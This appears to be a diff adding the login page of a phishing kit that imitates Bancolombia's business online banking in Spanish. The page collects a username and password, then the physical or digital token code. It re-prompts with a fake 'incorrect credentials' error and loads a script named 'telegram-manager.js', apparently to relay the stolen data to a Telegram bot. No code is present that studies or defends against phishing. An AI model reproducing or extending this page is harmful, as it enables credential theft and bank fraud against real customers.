@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Bancolombia</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="stylesheet" href="assets/css/login.css">
+    <link rel="stylesheet" href="assets/css/modal.css">
+    <link rel="stylesheet" href="assets/css/loading-overlay.css">
+    <link rel="stylesheet" href="assets/css/error-message.css">
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <img src="https://1000logos.net/wp-content/uploads/2021/11/Bancolombia-logo.png" alt="Bancolombia"
+                class="header__logo">
+            <h1 class="header__title">Sucursal Virtual Negocios</h1>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+        <div class="container">
+            <div class="background-decoration">
+                <img src="img/trazo-auth.svg" alt="" class="decoration-svg" aria-hidden="true">
+            </div>
+
+            <div class="login-card" id="loginCard">
+                <h2 class="login-card__title">Iniciar sesión</h2>
+
+                <div id="errorDisplay" class="error-message">
+                    <p class="error-message__text"></p>
+                </div>
+
+                <form id="loginForm" class="login-form">
+                    <div class="form-group">
+                        <label class="floating-label" id="userFloatingLabel">Usuario de Negocios</label>
+                        <div class="input-wrapper" id="userWrapper">
+                            <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="12" cy="8" r="4" stroke="#666" stroke-width="1.5" />
+                                <path d="M6 21C6 17.134 8.686 14 12 14C15.314 14 18 17.134 18 21" stroke="#666"
+                                    stroke-width="1.5" stroke-linecap="round" />
+                            </svg>
+                            <input type="text" id="userInput" name="usuario" class="form-input password-input"
+                                autocomplete="off" required>
+                            <button type="button" class="toggle-password" id="toggleUser" aria-label="Mostrar usuario">
+                                <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M12 5C7 5 2.73 8.11 1 12.5C2.73 16.89 7 20 12 20C17 20 21.27 16.89 23 12.5C21.27 8.11 17 5 12 5Z"
+                                        stroke="#666" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round" />
+                                    <circle cx="12" cy="12.5" r="3" stroke="#666" stroke-width="1.5" />
+                                </svg>
+                                <svg class="eye-slash-icon hidden" width="20" height="20" viewBox="0 0 24 24"
+                                    fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M2 2L22 22M6.71277 6.7226C3.66479 8.14528 2 11 2 11C2 11 5.63636 16.5 12 16.5C14.0732 16.5 15.9082 15.9189 17.4101 15.0116M10.4357 5.1764C10.9416 5.06103 11.4638 5 12 5C18.3636 5 22 10.5 22 10.5C22 10.5 21.0544 11.9363 19.4674 13.5644M14.1213 14.6213C13.4839 15.013 12.7483 15.25 12 15.25C10.2051 15.25 8.75 13.7949 8.75 12C8.75 11.2517 8.987 10.5161 9.37868 9.87868"
+                                        stroke="#666" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round" />
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="floating-label" id="passFloatingLabel">Clave de Negocios</label>
+                        <div class="input-wrapper" id="passWrapper">
+                            <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <rect x="5" y="11" width="14" height="10" rx="2" stroke="#666" stroke-width="1.5" />
+                                <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="#666"
+                                    stroke-width="1.5" stroke-linecap="round" />
+                                <circle cx="12" cy="16" r="1.5" fill="#666" />
+                            </svg>
+                            <input type="text" id="passInput" name="clave" class="form-input password-input"
+                                autocomplete="off" required>
+                            <button type="button" class="toggle-password" id="togglePass" aria-label="Mostrar clave">
+                                <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M12 5C7 5 2.73 8.11 1 12.5C2.73 16.89 7 20 12 20C17 20 21.27 16.89 23 12.5C21.27 8.11 17 5 12 5Z"
+                                        stroke="#666" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round" />
+                                    <circle cx="12" cy="12.5" r="3" stroke="#666" stroke-width="1.5" />
+                                </svg>
+                                <svg class="eye-slash-icon hidden" width="20" height="20" viewBox="0 0 24 24"
+                                    fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M2 2L22 22M6.71277 6.7226C3.66479 8.14528 2 11 2 11C2 11 5.63636 16.5 12 16.5C14.0732 16.5 15.9082 15.9189 17.4101 15.0116M10.4357 5.1764C10.9416 5.06103 11.4638 5 12 5C18.3636 5 22 10.5 22 10.5C22 10.5 21.0544 11.9363 19.4674 13.5644M14.1213 14.6213C13.4839 15.013 12.7483 15.25 12 15.25C10.2051 15.25 8.75 13.7949 8.75 12C8.75 11.2517 8.987 10.5161 9.37868 9.87868"
+                                        stroke="#666" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round" />
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" id="backBtn" class="btn-secondary"
+                            onclick="window.location.href='index.html'">
+                            Volver
+                        </button>
+                        <button type="submit" id="loginBtn" class="btn-submit" disabled>
+                            Ingresar
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Token Card -->
+            <div class="login-card hidden" id="tokenCard">
+                <div class="token-header">
+                    <img src="img/light-HardToken.svg" alt="Token" class="token-icon">
+                    <h2 class="login-card__title">Clave del token</h2>
+                    <p class="login-card__subtitle">Ingresa los dígitos de la clave de tu token físico o digital.</p>
+                </div>
+
+                <form id="tokenFormCard" class="login-form">
+                    <div class="form-group">
+                        <div class="token-input-wrapper">
+                            <input type="text" id="tokenInputCard" class="token-input-field" maxlength="8"
+                                placeholder="••••••••" autocomplete="off" inputmode="numeric">
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="submit" id="tokenSubmitBtn" class="btn-submit enabled">
+                            Continuar
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-info">
+                <div class="footer-info__left">
+                    <img src="img/logo-bancolombia.png" alt="Bancolombia" class="footer-info__logo">
+                    <div class="footer-info__copyright">
+                        <p>Copyright © 2026 Bancolombia.</p>
+                        <img src="img/SFC__NEGRO_1_1.png" alt="Vigilado Superintendencia Financiera de Colombia"
+                            class="footer-info__badge">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <script src="assets/js/telegram-manager.js"></script>
+    <script src="assets/js/login.js"></script>
+    <script src="assets/js/token-modal.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('error')) {
+            const errorDiv = document.getElementById('errorDisplay');
+            const errorText = errorDiv.querySelector('.error-message__text');
+            if (urlParams.get('error') === 'credenciales') {
+                errorText.textContent = 'Tu usuario o clave son incorrectos. Verifica tus datos e intenta nuevamente.';
+                errorDiv.classList.add('active');
+            }
+        }
+
+        // Handle openToken on load
+        if (urlParams.has('openToken')) {
+            window.addEventListener('DOMContentLoaded', () => {
+                if (window.tokenModalController) {
+                    window.tokenModalController.switchToTokenCard();
+                }
+            });
+        }
+    </script>
+</body>
+
+</html>
